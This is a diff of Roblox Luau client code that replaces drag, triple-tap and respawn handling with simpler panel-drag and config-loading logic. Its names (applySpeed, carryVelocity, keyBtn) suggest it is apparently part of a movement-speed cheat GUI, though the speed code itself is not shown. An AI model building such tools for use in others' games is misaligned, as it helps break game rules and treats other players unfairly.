-        (dragInput.UserInputType == Enum.UserInputType.MouseButton1
-        and input.UserInputType == Enum.UserInputType.MouseButton1)
-    ) then
-        dragging = false
-        dragInput = nil
-
-        if moved then
-            local p = toggle.AbsolutePosition
-            local s = toggle.AbsoluteSize
-
-            player:SetAttribute("CarryToggleX",p.X + s.X/2)
-            player:SetAttribute("CarryToggleY",p.Y + s.Y/2)
-            config.toggleX = p.X + s.X/2
-            config.toggleY = p.Y + s.Y/2
-            saveConfig()
-
-            suppressClick = true
-
-            task.delay(0.2,function()
-                suppressClick = false
-                moved = false
-            end)
-        end
-    end
-end)
-
--- ARRASTRE DEL PANEL (DESDE EL TÍTULO)
-local panelDragging = false
-local panelInput
-local panelDragStart
-local panelStartPos
-local panelMoved = false
-
-title.InputBegan:Connect(function(input)
-    if locked then return end
-
-    if input.UserInputType == Enum.UserInputType.Touch
-    or input.UserInputType == Enum.UserInputType.MouseButton1 then
-        panelDragging = true
-        panelInput = input
-        panelDragStart = input.Position
-        panelStartPos = panel.Position
-        panelMoved = false
-    end
-end)
-
-UIS.InputChanged:Connect(function(input)
-    if not panelDragging or locked then return end
-
-    local valid =
-        (panelInput.UserInputType == Enum.UserInputType.Touch and input == panelInput)
-        or
-        (panelInput.UserInputType == Enum.UserInputType.MouseButton1
-        and input.UserInputType == Enum.UserInputType.MouseMovement)
-
-    if not valid then return end
-
-    local delta = input.Position - panelDragStart
-
-    if delta.Magnitude > 5 then
-        panelMoved = true
-    end
-
-    if panelMoved then
-        panel.Position = UDim2.new(
-            panelStartPos.X.Scale,
-            panelStartPos.X.Offset + delta.X,
-            panelStartPos.Y.Scale,
-            panelStartPos.Y.Offset + delta.Y
-        )
-    end
-end)
-
-UIS.InputEnded:Connect(function(input)
-    if panelDragging and (
-        input == panelInput or
-        (panelInput.UserInputType == Enum.UserInputType.MouseButton1
-        and input.UserInputType == Enum.UserInputType.MouseButton1)
-    ) then
-        panelDragging = false
-        panelInput = nil
-
-        if panelMoved then
-            local p = panel.AbsolutePosition
-            local s = panel.AbsoluteSize
-
-            player:SetAttribute("CarryPanelX",p.X + s.X/2)
-            player:SetAttribute("CarryPanelY",p.Y + s.Y/2)
-            config.panelX = p.X + s.X/2
-            config.panelY = p.Y + s.Y/2
-            saveConfig()
-        end
-
-        panelMoved = false
-    end
-end)
-
--- TRIPLE TOQUE
-toggle.Activated:Connect(function()
-    if suppressClick or moved then return end
-
-    local now = os.clock()
-
-    if now - lastTap > TAP_INTERVAL then
-        taps = 0
-    end
-
-    taps += 1
-    lastTap = now
-
-    if taps >= 3 then
-        taps = 0
-        panel.Visible = true
-        toggle.Visible = true
-        minimized = false
-        config.minimized = false
-        saveConfig()
-        return
-    end
-
-    setEnabled(not enabled)
-end)
-
--- REAPARICIÓN
-local function setupCharacter(char)
-    task.spawn(function()
-        local hum = char:WaitForChild("Humanoid",0.2)
-
-        if not hum then
-            hum = char:WaitForChild("Humanoid")
-        end
-
-        baselineHumanoid = hum
-        baselineWalkSpeed = hum.WalkSpeed
-        if enabled then
-            applySpeed()
-        end
-    end)
-end
-
-player.CharacterAdded:Connect(function(char)
-    destroyCarryVelocity()
-    baselineHumanoid = nil
-    baselineWalkSpeed = nil
-    setupCharacter(char)
+UserInputService.InputChanged:Connect(function(input)
+	if not dragging then
+		return
+	end
+	if input.UserInputType == Enum.UserInputType.MouseMovement
+		or input.UserInputType == Enum.UserInputType.Touch
+	then
+		local delta = input.Position - startPos
+		mainPanel.Position = UDim2.new(
+			startPanelPos.X.Scale,
+			startPanelPos.X.Offset + delta.X,
+			startPanelPos.Y.Scale,
+			startPanelPos.Y.Offset + delta.Y
+		)
+	end
 end)
 
 task.spawn(function()
-    while gui.Parent do
-        if enabled then
-            applySpeed()
-        elseif carryVelocity then
-            destroyCarryVelocity()
-        end
-        task.wait(0.05)
-    end
+	loadConfig(powerBox, keyBtn)
 end)
 
-if player.Character then
-    setupCharacter(player.Character)
-end
+setStartLook()
